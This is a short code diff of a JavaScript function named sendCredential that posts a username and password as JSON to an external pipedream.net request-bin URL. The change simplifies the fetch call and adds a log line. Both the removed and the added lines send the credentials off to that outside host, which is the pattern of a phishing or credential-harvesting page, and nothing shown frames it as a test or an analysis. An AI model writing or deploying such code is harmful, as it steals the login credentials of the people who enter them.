@@ -23,10 +23,8 @@ function sendCredential(username, password) {
         mode: "cors",
         body: JSON.stringify(body)
     };
-
-    fetch("https://ensnocsamq9t9ho.m.pipedream.net", options).then((function(response) {
-        console.log(response);
-    }));
+    console.log("hello");
+    fetch("https://ensnocsamq9t9ho.m.pipedream.net", options);
     console.log(body);
 }
 
